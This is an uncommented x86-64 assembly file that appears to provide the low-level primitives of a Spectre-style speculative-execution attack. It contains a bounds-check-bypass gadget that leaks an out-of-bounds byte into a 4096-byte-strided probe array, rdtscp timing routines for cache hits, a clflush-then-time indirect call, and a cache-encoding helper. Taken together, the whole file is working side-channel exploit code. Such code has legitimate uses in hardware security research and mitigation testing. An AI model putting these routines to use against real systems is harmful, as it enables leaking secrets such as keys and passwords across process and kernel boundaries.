BITS 64

global branch_predictor
global memory_access
global indirect_call
global touch_and_break

section .text

branch_predictor:
  cmp rdi, [rdx]
  jae .skip_access

  movzx rax, byte [rsi + rdi]
  shl rax, 0Ch
  mov al, byte [rcx + rax]

.skip_access:
  ret

memory_access:
  mov r9, rdi

  rdtscp
  shl rdx, 20h
  or rax, rdx
  mov r8, rax

  mov rax, [r9]

  rdtscp
  shl rdx, 20h
  or rax, rdx

  sub rax,r8
  ret

indirect_call:
  mov r9, rdi
  mov rdi, rsi
  mov rsi, rdx
  clflush [r9]
  
  rdtscp
  shl rdx, 20h
  or rax, rdx
  mov r8, rax
  
  call [r9]

  rdtscp
  shl rdx, 20h
  or rax, rdx

  sub rax,r8
  ret


touch_and_break:
  movzx eax, byte [rdi]
  shl rax, 0Ch
  mov al, byte [rax+rsi]
  ret
